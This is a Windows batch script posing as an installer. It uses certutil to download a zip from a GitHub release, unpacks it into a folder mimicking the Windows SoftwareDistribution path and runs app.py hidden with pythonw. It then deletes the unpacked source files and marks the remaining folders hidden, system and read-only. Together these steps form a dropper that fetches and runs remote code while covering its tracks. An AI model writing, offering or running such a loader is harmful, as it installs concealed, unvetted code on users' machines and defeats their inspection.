@echo off
setlocal

:: Define install folder
set "appdir=C:\ProgramData\SoftwareDistribution\Setup"

:: Remove old version if it exists
if exist "%appdir%" rmdir /s /q "%appdir%"

:: Create program folder
mkdir "%appdir%"
cd "%appdir%"

:: Download index.zip from GitHub
echo Downloading package...
certutil -urlcache -split -f "https://github.com/CursedCore2025/nawoicw/releases/download/cesccv/index.zip" index.zip >nul

:: Extract the zip (Windows 10/11 built-in tar)
echo Extracting...
tar -xf index.zip
del index.zip

:: Go into extracted repo (looks for app.py)
for /d %%i in (*) do (
    if exist "%%i\app.py" (
        move "%%i\*" "%appdir%" >nul
        rmdir /s /q "%%i"
        goto runapp
    )
)

:runapp
:: Run without console using pythonw
echo Launching app...
start "" /min pythonw "%appdir%\app.py"

:: Wait a few seconds to make sure app.py is loaded
timeout /t 1 /nobreak >nul

:: Delete all files and folders except __pycache__
echo Cleaning up files (except __pycache__)...
for %%f in ("%appdir%\*") do (
    if /i not "%%~nxf"=="__pycache__" (
        if exist "%%f" (
            if exist "%%f\" (
                rmdir /s /q "%%f"
            ) else (
                del /f /q "%%f"
            )
        )
    )
)


:: Set __pycache__ and templates folders as hidden, system, read-only
attrib +h +s +r "%appdir%\__pycache__"
attrib +h +s +r "%appdir%\templates"

endlocal
exit
